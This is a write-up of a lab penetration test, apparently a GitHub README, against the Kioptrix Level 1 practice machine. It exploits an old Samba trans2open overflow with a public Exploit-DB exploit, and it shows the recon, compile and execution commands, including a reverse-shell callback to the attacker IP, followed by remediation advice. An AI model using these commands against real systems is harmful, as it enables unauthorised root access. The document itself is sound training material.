# Kioptrix Level 1 - Penetration Test Report 🚩

**Date:** 2025-12-05

**Attacker IP:** 192.168.1.106

**Target IP:** 192.168.1.107

**Difficulty:** Easy/Beginner

---

## 📝 Executive Summary
This report documents the successful penetration testing of the **Kioptrix Level 1** machine. The objective was to identify vulnerabilities and gain root access.

**Key Findings:**
- The target system was running an outdated version of **Samba (2.2.1a)**.
- A critical **Remote Code Execution (RCE)** vulnerability (CVE-2003-0201) was identified.
- **Root access** was achieved via manual exploitation (compiling C exploit).

---

## 🔍 1. Reconnaissance & Enumeration

### Network Discovery
Used `arp-scan` to identify the target in the local network.
```bash
sudo arp-scan -l
# Target identified at 192.168.1.107 (VirtualBox Vendor)
```
### Port Scanning
Performed an Nmap scan to identify running services.
```
nmap -sC -sV 192.168.1.107
```
Results:
<img width="840" height="297" alt="Screenshot 2025-12-05 085115" src="https://github.com/user-attachments/assets/08a158a2-3bb3-4d19-9118-4635d9f6dab4" />


### Vulnerability Analysis
Further enumeration on Port 139 using Metasploit's auxiliary scanner confirmed the exact version.
```
# Metasploit Auxiliary
use auxiliary/scanner/smb/smb_version
```
Result: 
<img width="940" height="139" alt="Screenshot 2025-12-05 090803" src="https://github.com/user-attachments/assets/649b0b9f-12dd-437a-a5b6-0cbac09bee1e" />

Research indicated that Samba 2.2.1a is vulnerable to trans2open Overflow (Remote Code Execution).

--- 

## ⚔️ 2. Exploitation (Manual) 
Instead of using Metasploit's auto-exploit, I opted for a manual approach using a C-based exploit found in Exploit-DB.

Exploit Used: linux/remote/10.c (Samba < 2.2.8 - trans2open)

### Step 1: Retrieval & Compilation 
```
searchsploit -m 10.c
```
```
gcc 10.c -o exploit
```
### Step 2: Execution 
Executed the compiled exploit targeting the Linux platform (-b 0) with a callback to the attacking machine.
```
./exploit -b 0 -v -c 192.168.1.106 192.168.1.107
```
Outcome: The exploit successfully triggered a buffer overflow, creating a reverse shell connection with Root privileges.
<img width="618" height="262" alt="Screenshot 2025-12-05 093304" src="https://github.com/user-attachments/assets/2e7a6240-c00a-4ac1-b6e8-d242ba8606f1" />

---

## 💎 3. Post-Exploitation 
Privilege Verification
Confirmed root access:
```
whoami
```
Output: root
<img width="618" height="53" alt="Screenshot 2025-12-05 09330466" src="https://github.com/user-attachments/assets/795e4921-1b4d-41ee-aff1-2f69c079c08f" />

---

## 🛡️ 4. Remediation
To mitigate this vulnerability, the following actions are recommended:

Patch Management: Update Samba to the latest stable version immediately.

Firewall Configuration: Restrict access to Port 139/445 to trusted internal IPs only.

Disable SMBv1: SMBv1 is obsolete and insecure; disable it in the smb.conf file.

---

## 📚 Skills Learned
Network enumeration (arp-scan, nmap)

Identifying legacy service vulnerabilities (Samba)

Manual Exploitation (Compiling C exploits)

Post-exploitation enumeration (/var/mail, /etc/shadow)

---

*** Disclaimer: This project is for educational purposes only. Tested on a local virtual environment. ***
